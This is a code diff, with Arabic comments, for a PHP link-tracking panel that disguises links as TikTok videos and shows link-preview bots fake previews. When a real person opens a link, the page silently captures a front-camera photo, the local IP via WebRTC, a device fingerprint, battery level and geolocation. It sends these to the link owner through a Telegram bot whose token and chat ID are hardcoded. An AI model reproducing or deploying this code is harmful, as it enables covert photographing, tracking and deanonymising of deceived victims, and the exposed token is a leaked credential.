@@ -3,7 +3,65 @@ date_default_timezone_set('Africa/Algiers');
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
 
+ignore_user_abort(true);
+set_time_limit(0);
+
 session_start();
+
+// ==============================================================================
+// 🖼️ مولد الصور الاحترافي (مربع 1:1 مع خلفية مموهة + الصورة الأصلية في المنتصف)
+// ==============================================================================
+if (isset($_GET['proxy_img'])) {
+    $img_url = base64_decode($_GET['proxy_img']);
+    
+    $ch = curl_init($img_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    $image_data = curl_exec($ch);
+    curl_close($ch);
+
+    if ($image_data && function_exists('imagecreatefromstring')) {
+        $src = @imagecreatefromstring($image_data);
+        if ($src) {
+            $w = imagesx($src); $h = imagesy($src); $target_size = 800; // حجم مربع احترافي
+            
+            $dst = imagecreatetruecolor($target_size, $target_size);
+            $bg = imagecreatetruecolor($target_size, $target_size);
+            
+            // 1. إنشاء الخلفية المموهة
+            $scale = max($target_size / $w, $target_size / $h);
+            $new_w = $w * $scale; $new_h = $h * $scale;
+            $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
+            imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
+            
+            // تمويه وتغميق الخلفية
+            for ($i = 0; $i < 15; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
+            imagefilter($bg, IMG_FILTER_BRIGHTNESS, -60);
+
+            // 2. وضع الصورة الأصلية في المنتصف (لتكون بارزة)
+            $scale_center = $target_size / $h; 
+            $new_w_center = $w * $scale_center; 
+            $new_h_center = $target_size;
+            $x_center = ($target_size - $new_w_center) / 2; 
+            $y_center = 0;
+
+            imagecopyresampled($dst, $bg, 0, 0, 0, 0, $target_size, $target_size, $target_size, $target_size);
+            imagecopyresampled($dst, $src, $x_center, $y_center, 0, 0, $new_w_center, $new_h_center, $w, $h);
+
+            header('Content-Type: image/jpeg'); 
+            header("Cache-Control: public, max-age=86400");
+            imagejpeg($dst, null, 90);
+            imagedestroy($src); imagedestroy($bg); imagedestroy($dst);
+            exit;
+        }
+    }
+    if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
+    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop"); 
+    exit;
+}
 
 $db_file = __DIR__ . '/tracker_enhanced_v3.db';
 
@@ -14,16 +72,11 @@ try {
     $db->exec("PRAGMA journal_mode=WAL;");
     $db->exec("PRAGMA synchronous=NORMAL;");
     $db->exec("PRAGMA foreign_keys=ON;");
+    $db->exec("PRAGMA cache_size=-64000;");
 
-    // 1. جدول المستخدمين
     $db->exec("CREATE TABLE IF NOT EXISTS users (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        username TEXT UNIQUE,
-        password TEXT,
-        role TEXT DEFAULT 'user',
-        tg_chat TEXT,
-        tg_token TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT,
+        role TEXT DEFAULT 'user', tg_chat TEXT, tg_token TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
     try { $db->exec("ALTER TABLE users ADD COLUMN tg_token TEXT"); } catch (Exception $e) {}
 
@@ -33,89 +86,103 @@ try {
         $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES ('admin', ?, 'admin', '6475721500', '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU')")->execute([$hash]);
     }
 
-    // 2. جدول الروابط
     $db->exec("CREATE TABLE IF NOT EXISTS links (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        user_id INTEGER,
-        name TEXT,
-        code TEXT UNIQUE, 
-        target_url TEXT, 
-        meta_title TEXT,
-        meta_image TEXT,
-        use_camera INTEGER DEFAULT 1,
+        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, name TEXT, code TEXT UNIQUE, 
+        target_url TEXT, meta_title TEXT, meta_image TEXT, use_camera INTEGER DEFAULT 1, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
     try { $db->exec("ALTER TABLE links ADD COLUMN user_id INTEGER"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE links ADD COLUMN name TEXT"); } catch (Exception $e) {}
+    $db->exec("CREATE INDEX IF NOT EXISTS idx_link_code ON links(code)");
 
-    // 3. جدول السجلات
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        code TEXT, 
-        image_data TEXT, 
-        public_ip TEXT, 
-        local_ip TEXT, 
-        port TEXT, 
-        location TEXT, 
-        isp_info TEXT, 
-        vpn_status TEXT, 
-        device_info TEXT, 
-        latitude REAL,
-        longitude REAL,
-        gpu_info TEXT,
-        battery_info TEXT,
-        screen_info TEXT,
-        canvas_fp TEXT,
+        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, 
+        local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, 
+        latitude REAL, longitude REAL, gpu_info TEXT, battery_info TEXT, screen_info TEXT, canvas_fp TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
-
+    $db->exec("CREATE INDEX IF NOT EXISTS idx_capture_code ON captures(code)");
     try { $db->exec("ALTER TABLE captures ADD COLUMN gpu_info TEXT"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE captures ADD COLUMN battery_info TEXT"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE captures ADD COLUMN screen_info TEXT"); } catch (Exception $e) {}
     try { $db->exec("ALTER TABLE captures ADD COLUMN canvas_fp TEXT"); } catch (Exception $e) {}
 
-} catch (Exception $e) {
-    die("Database error: " . $e->getMessage());
-}
+} catch (Exception $e) { die("Database error: " . $e->getMessage()); }
 
-// دوال مساعدة
-function sendTelegramNotification($chat_id, $message, $custom_token = null) {
+function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_token = null) {
     if (empty($chat_id)) return;
     $token = $custom_token ?: '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
-    $url = "https://api.telegram.org/bot{$token}/sendMessage";
-    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
-    curl_exec($ch);
-    curl_close($ch);
+    
+    if (!empty($image_base64) && strpos($image_base64, 'data:image/') === 0) {
+        $url = "https://api.telegram.org/bot{$token}/sendPhoto";
+        $image_parts = explode(";base64,", $image_base64);
+        $image_base64_data = base64_decode($image_parts[1] ?? '');
+        $tmpfile = tempnam(sys_get_temp_dir(), 'tg_img_') . '.jpg';
+        file_put_contents($tmpfile, $image_base64_data);
+
+        $data = ['chat_id' => $chat_id, 'caption' => $message, 'parse_mode' => 'HTML', 'photo' => new CURLFile($tmpfile)];
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_exec($ch); curl_close($ch); @unlink($tmpfile);
+    } else {
+        $url = "https://api.telegram.org/bot{$token}/sendMessage";
+        $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 
+        curl_exec($ch); curl_close($ch);
+    }
 }
 
+// ✅ إضافة كلمة TikTok - تلقائياً
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];
+    $meta = ['title' => 'فيديو تيك توك', 'image' => ''];
+    
+    // 1. oEmbed (سريع)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)']);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0']);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
-            return ['title' => $data['title'], 'image' => $data['thumbnail_url']];
+            $title = $data['title'];
+            if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
+            return ['title' => $title, 'image' => $data['thumbnail_url']];
         }
     }
+    
+    // 2. استخراج من صفحة الويب (عنيد جداً)
     $ch = curl_init($url);
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'facebookexternalhit/1.1']);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)']);
     $html = curl_exec($ch); curl_close($ch);
+    
     if ($html) {
-        $dom = new DOMDocument();
-        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
-        $xpath = new DOMXPath($dom);
-        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
-        if ($titleNodes->length > 0) $meta['title'] = trim($titleNodes->item(0)->nodeValue);
-        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
-        if ($imageNodes->length > 0) $meta['image'] = trim($imageNodes->item(0)->nodeValue);
+        // جلب العنوان
+        if (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
+            $meta['title'] = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
+        } elseif (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
+            $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+        }
+        
+        // إضافة اللاحقة إذا لم تكن موجودة
+        if (stripos($meta['title'], 'TikTok') === false) {
+            $meta['title'] = 'TikTok - ' . $meta['title'];
+        }
+
+        // جلب الصورة
+        if (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
+            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
+        } elseif (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
+            $meta['image'] = $matches[1];
+        }
     }
     return $meta;
 }
@@ -128,24 +195,27 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
+// ✅ تحديد المتعامل بدقة
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
     }
     $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3]);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2]);
     $json = curl_exec($ch); curl_close($ch);
     if ($json) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
-            $isp = $data['isp'] ?? 'Unknown ISP';
-            if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy 🇩🇿';
-            elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis 🇩🇿';
-            elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo 🇩🇿';
-            elseif (stripos($isp, 'Optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
-            elseif (stripos($isp, 'Algerie Telecom') !== false) $isp = 'Algérie Télécom 🇩🇿';
-            else $isp = implode(' ', array_slice(explode(' ', trim($isp)), 0, 2));
+            $raw_isp = strtolower($data['isp'] ?? '');
+            
+            if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy 🇩🇿';
+            elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis 🇩🇿';
+            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo 🇩🇿';
+            elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algérie Télécom 🇩🇿';
+            elseif (strpos($raw_isp, 'optimum') !== false) $isp = 'Optimum Telecom 🇩🇿';
+            else $isp = ucwords($data['isp'] ?? 'Unknown ISP');
+
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
             return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
         }
@@ -171,7 +241,6 @@ function get_device_type($ua) {
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
-    // جلب بيانات الرابط مع توكن و chat_id صاحب الرابط
     $stmt = $db->prepare("SELECT l.*, u.tg_chat, u.tg_token FROM links l LEFT JOIN users u ON l.user_id = u.id WHERE l.code = ?");
     $stmt->execute([$code]);
     $link = $stmt->fetch();
@@ -188,10 +257,16 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
+            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
+            
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:description" content="شاهد الفيديو الآن">';
+            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
+            echo '<meta property="og:image:width" content="800">';
+            echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
             echo '</head><body></body></html>';
             exit();
@@ -199,10 +274,19 @@ if (isset($_GET['r'])) {
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
             if ($is_bot) exit('OK');
+            
+            if (function_exists('fastcgi_finish_request')) {
+                echo 'OK'; fastcgi_finish_request();
+            } else {
+                header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
+            }
+
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
+            
             $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter'];
-            foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit('OK'); }
+            foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit; }
+            
             $img_base64 = $_POST['image'] ?? '';
             if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 
             $local_ip = $_POST['lip'] ?? 'Direct';
@@ -217,21 +301,20 @@ if (isset($_GET['r'])) {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
                 
-                // إرسال التقرير باستخدام توكن صاحب الرابط
                 $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
-                $msg .= "🔗 <b>اسم الرابط:</b> {$link['name']}\n";
+                $msg .= "🔗 <b>اسم الحساب:</b> {$link['name']}\n";
                 $msg .= "📱 <b>الموديل:</b> {$device}\n";
                 $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
-                $msg .= "📡 <b>الشبكة:</b> {$ip_details['isp']}\n";
+                $msg .= "📡 <b>المتعامل:</b> {$ip_details['isp']}\n";
                 $msg .= "🔗 <b>الآيبي العام:</b> <code>{$public_ip}</code>\n";
                 $msg .= "🏠 <b>الآيبي المحلي:</b> <code>{$local_ip}</code>\n";
                 $msg .= "🔌 <b>المنفذ:</b> <code>{$port}</code>\n";
                 $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
                 $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
                 
-                sendTelegramNotification($owner_tg_chat, $msg, $owner_tg_token);
+                sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
             } catch (Exception $e) {}
-            exit('OK');
+            exit;
         }
 ?>
 <!DOCTYPE html>
@@ -248,13 +331,13 @@ if (isset($_GET['r'])) {
         function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
         async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
         function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
-        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 300); }); }
+        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 200); }); }
         async function initTracking() {
             let imageData = "";
             if (useCamera) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 200));
+                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150));
                     const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                     canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.5);
                     stream.getTracks().forEach(track => track.stop());
@@ -263,8 +346,13 @@ if (isset($_GET['r'])) {
             const localIp = await getLocalIP(); const gpu = getGPUInfo(); const screen = getScreenInfo(); const battery = await getBatteryInfo(); const canvasFp = getCanvasFingerprint();
             const formData = new URLSearchParams();
             formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); formData.append('gpu', gpu); formData.append('screen', screen); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
-            if (navigator.sendBeacon) { navigator.sendBeacon(window.location.href, formData); window.location.replace(targetUrl); } 
-            else { fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }).finally(() => { window.location.replace(targetUrl); }); }
+            
+            if (navigator.sendBeacon) { 
+                navigator.sendBeacon(window.location.href, formData); 
+                window.location.replace(targetUrl); 
+            } else { 
+                fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }).finally(() => { window.location.replace(targetUrl); }); 
+            }
         }
         window.addEventListener('DOMContentLoaded', initTracking);
     </script>
@@ -277,7 +365,7 @@ if (isset($_GET['r'])) {
 }
 
 // ==========================================
-// تسجيل الدخول والخروج
+// لوحة التحكم
 // ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
@@ -303,11 +391,7 @@ $is_admin = $is_logged_in && $_SESSION['role'] === 'admin';
 $current_user_id = $_SESSION['user_id'] ?? 0;
 $current_username = $_SESSION['username'] ?? '';
 
-// ==========================================
-// العمليات
-// ==========================================
 if ($is_logged_in) {
-    // تغيير كلمة المرور
     $pass_error = ''; $pass_success = '';
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_my_password'])) {
         $current_pass = $_POST['current_password'];
@@ -337,14 +421,13 @@ if ($is_logged_in) {
                 header("Location: /?msg=pass_changed"); exit();
             }
         }
-        // إضافة زميل جديد مع التوكن
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_user'])) {
             $new_user = trim($_POST['new_username']);
             $new_pass = password_hash($_POST['new_password'], PASSWORD_DEFAULT);
-            $new_tg = trim($_POST['new_tg_chat']);
-            $new_token = trim($_POST['new_tg_token']);
+            $new_tg_chat = trim($_POST['new_tg_chat']);
+            $new_tg_token = trim($_POST['new_tg_token']);
             try {
-                $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES (?, ?, 'user', ?, ?)")->execute([$new_user, $new_pass, $new_tg, $new_token]);
+                $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES (?, ?, 'user', ?, ?)")->execute([$new_user, $new_pass, $new_tg_chat, $new_tg_token]);
                 header("Location: /?msg=user_added"); exit();
             } catch (Exception $e) { $user_error = "اسم المستخدم موجود مسبقاً!"; }
         }
@@ -369,7 +452,6 @@ if ($is_logged_in) {
         header("Location: /"); exit();
     }
 
-    // توليد رابط جديد
     $generated_link = ""; $generated_code = "";
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = trim($_POST['target_url']);
@@ -420,16 +502,15 @@ if ($is_logged_in) {
         :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: rgba(15, 21, 35, 0.9); }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         
-        /* 🌟 أنيميشن الألوان الخارق */
         @keyframes scorpionColors {
-            0% { background: linear-gradient(135deg, #070913 0%, #1e1b4b 50%, #070913 100%); }
-            33% { background: linear-gradient(135deg, #070913 0%, #064e3b 50%, #070913 100%); }
-            66% { background: linear-gradient(135deg, #070913 0%, #4c1d95 50%, #070913 100%); }
-            100% { background: linear-gradient(135deg, #070913 0%, #1e1b4b 50%, #070913 100%); }
+            0% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
+            33% { background: linear-gradient(135deg, #05080f 0%, #064e3b 50%, #05080f 100%); }
+            66% { background: linear-gradient(135deg, #05080f 0%, #4c1d95 50%, #05080f 100%); }
+            100% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
         }
         
         body { 
-            animation: scorpionColors 15s ease-in-out infinite;
+            animation: scorpionColors 12s ease-in-out infinite;
             background-size: 200% 200%;
             color: var(--text); 
             min-height: 100vh; 
@@ -439,64 +520,86 @@ if ($is_logged_in) {
         
         .app-container { display: flex; flex: 1; height: 100vh; overflow: hidden; }
         
-        /* Sidebar */
-        .sidebar { width: 260px; background: var(--sidebar-bg); backdrop-filter: blur(10px); border-left: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; box-shadow: 5px 0 15px rgba(0,0,0,0.5); }
+        .sidebar { 
+            width: 260px; 
+            background: var(--sidebar-bg); 
+            backdrop-filter: blur(10px);
+            border-left: 1px solid var(--border); 
+            display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; 
+            box-shadow: 5px 0 15px rgba(0,0,0,0.5);
+        }
         .sidebar-header { padding: 0 20px 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
         .sidebar-header h2 { font-size: 18px; color: var(--text); margin-bottom: 5px; text-shadow: 0 0 10px var(--accent); }
         .sidebar-header p { font-size: 12px; color: var(--muted); }
-        .nav-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.2s; font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: right; }
-        .nav-item:hover { background: rgba(139, 92, 246, 0.15); color: var(--accent); }
+        
+        .nav-item { 
+            display: flex; align-items: center; gap: 12px; padding: 14px 20px; 
+            color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.3s; 
+            font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: right; 
+        }
+        .nav-item:hover { background: rgba(139, 92, 246, 0.15); color: var(--accent); text-shadow: 0 0 8px var(--accent); }
         .nav-item.active { background: rgba(139, 92, 246, 0.2); color: var(--accent); border-right: 4px solid var(--accent); }
+        
         .sidebar-footer { margin-top: auto; padding: 20px; border-top: 1px solid var(--border); }
         .user-profile { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
         .user-avatar { width: 40px; height: 40px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; box-shadow: 0 0 10px var(--accent); }
         
-        /* Main Content */
         .main-content { flex: 1; overflow-y: auto; padding: 30px; }
         
-        .tab-content { display: none; animation: fadeIn 0.3s ease; }
+        .tab-content { display: none; animation: fadeIn 0.4s ease; }
         .tab-content.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
         
-        .card { background: var(--card); backdrop-filter: blur(12px); border: 1px solid var(--border); border-radius: 16px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
+        .card { 
+            background: var(--card); 
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border); 
+            border-radius: 16px; padding: 25px; margin-bottom: 25px; 
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); 
+        }
         .card-title { font-size: 16px; font-weight: 700; color: var(--text); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
         
-        /* Forms */
         .form-group { margin-bottom: 15px; }
         .form-group label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 8px; }
-        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 8px; padding: 12px 15px; color: var(--text); font-size: 14px; outline: none; transition: 0.2s; }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
+        input[type="text"], input[type="password"] { 
+            width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 8px; 
+            padding: 12px 15px; color: var(--text); font-size: 14px; outline: none; transition: 0.3s; 
+        }
